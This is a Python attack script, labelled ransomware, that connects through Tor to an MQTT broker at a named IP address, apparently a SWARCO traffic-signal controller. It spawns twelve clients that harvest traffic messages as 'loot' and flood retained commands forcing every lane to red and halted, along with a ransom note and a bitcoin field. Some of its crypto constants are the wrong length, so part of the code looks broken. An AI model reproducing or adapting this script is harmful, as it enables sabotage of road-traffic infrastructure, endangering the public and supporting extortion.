#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.8 | AES COMPLETO | MQTT 1.6.1 SAFE

import paho.mqtt.client as mqtt
import json, time, threading, os, random, base64, socks, socket
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_OK = True
except ImportError:
    print("❌ Installa: pip install cryptography")
    exit(1)

class SWARCORansomware:
    def __init__(self):
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.btc_addr = "fucknomoneySUCCHIALO"
        
        # 🔐 AES-256 COMPLETO 32 BYTES
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!X'
        self.aes_iv = b'SWARCO_SEMAFORI_16BYTES'
        
        self.clients = []
        self.attack_running = True
        print("✅ CRYPTOGRAPHY OK - AES-256 READY")
    
    def aes_encrypt_full(self, plaintext):
        """🔐 CIFRA TUTTO CON AES-256 CBC"""
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.aes_iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        # Padding PKCS7
        padding_len = 16 - (len(plaintext.encode()) % 16)
        padded_data = plaintext.encode() + bytes([padding_len] * padding_len)
        
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(ciphertext).decode()
    
    def force_red_payload(self):
        ts = time.strftime("%Y-%m-%dT%H:%M:%S")
        payload = {
            "timestamp": ts,
            "OPERATION": "TRUSTEDF57",
            "BTC": self.btc_addr,
            "STATUS": "ALL_LANES_FORCE_RED",
            "traffic_triggers": {
                "lane1": {"FORCE_RED": True, "HALT": True},
                "lane2": {"FORCE_RED": True, "HALT": True},
                "lane3": {"FORCE_RED": True, "HALT": True},
                "lane10": {"FORCE_RED": True, "HALT": True},
                "lane15": {"FORCE_RED": True, "HALT": True},
                "lane16": {"FORCE_RED": True, "HALT": True}
            }
        }
        return json.dumps(payload)
    
    def nuclear_aes_flood(self):
        """💣 FLOOD AES MASSICCIO"""
        ransom_note = f"TRUSTEDF57_RANSOMWARE\nBTC: {self.btc_addr}\nKEY: {self.aes_key.hex()}\nALL_ROUTES_BLOCKED"
        aes_payload = self.aes_encrypt_full(ransom_note)
        return aes_payload
    
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print(f"✅ {client._client_id} CONNECTED")
            client.subscribe("traffic-triggers-output")
            client.subscribe("traffic-statistic-output/#")
        else:
            print(f"❌ {client._client_id} RC={rc}")
    
    def on_message(self, client, userdata, msg):
        raw_data = msg.payload.decode('utf-8', errors='ignore')
        print(f"📦 LOOT {msg.topic}: {raw_data[:50]}...")
        
        # 🔐 CIFRA OGNI MESSAGGIO SWARCO
        encrypted_loot = self.aes_encrypt_full(f"{msg.topic}|{raw_data}|{time.time()}")
        
        loot_file = "swarco_nuclear.aes"
        try:
            with open(loot_file, "ab") as f:
                f.write(encrypted_loot.encode() + b"\n")
            size = os.path.getsize(loot_file)
            if size % 10000 < 100:  # Print ogni 10KB
                print(f"💾 NUCLEAR LOOT: {size/1024:.1f}KB")
        except:
            pass
    
    def spawn_client(self, client_id):
        """🚀 CLIENT SENZA CALLBACK PROBLEMI"""
        client = mqtt.Client(client_id=client_id)
        client.on_connect = self.on_connect
        client.on_message = self.on_message
        
        # CONNECT SEMPLICE
        try:
            client.connect(self.target_ip, self.port, 60)
            client.loop_start()
            time.sleep(1)
            return client
        except Exception as e:
            print(f"❌ Spawn {client_id}: {e}")
            return None
    
    def relentless_attack(self):
        """⚡ ATTACCO CONTINUO 15Hz"""
        payloads = [
            self.force_red_payload(),
            self.nuclear_aes_flood(),
            json.dumps({"☢️": "TRUSTEDF57_NUCLEAR", "BTC": self.btc_addr}),
            '{"ALL_LANES": "FORCE_RED", "OP": "TRUSTEDF57"}'
        ]
        
        while self.attack_running:
            for client in self.clients[:]:
                if client and client._sock:
                    topic = random.choice([
                        "traffic-triggers-output",
                        "traffic-statistic-output/sensor1",
                        "traffic-statistic-output/sensor2",
                        "#"
                    ])
                    payload = random.choice(payloads)
                    
                    try:
                        client.publish(topic, payload, qos=2, retain=True)
                    except:
                        pass
            
            time.sleep(0.066)  # 15Hz MADNESS
    
    def run(self):
        print("💣 TRUSTEDF57 v2.8-NUCLEAR | AES-256 FULL | 12 CLIENTS")
        os.system("rm -f swarco_nuclear.aes")
        
        # 12 CLIENTS PARALLELI
        for i in range(12):
            client = self.spawn_client(f"NUCLEAR_{i:02d}")
            if client:
                self.clients.append(client)
            time.sleep(0.3)
        
        print("🚀 NUCLEAR ATTACK START - TUTTO CIFRATO!")
        
        # ATTACCO INFINITO
        attack_thread = threading.Thread(target=self.relentless_attack)
        attack_thread.daemon = True
        attack_thread.start()
        
        # MONITOR
        try:
            while True:
                time.sleep(15)
                loot_size = os.path.getsize("swarco_nuclear.aes")
                live_clients = len([c for c in self.clients if c and c._sock])
                print(f"📊 Live: {live_clients}/12 | Loot: {loot_size/1024/1024:.2f}MB")
        except KeyboardInterrupt:
            print("\n🛑 NUCLEAR STOP")

if __name__ == "__main__":
    rw = SWARCORansomware()
    rw.run()
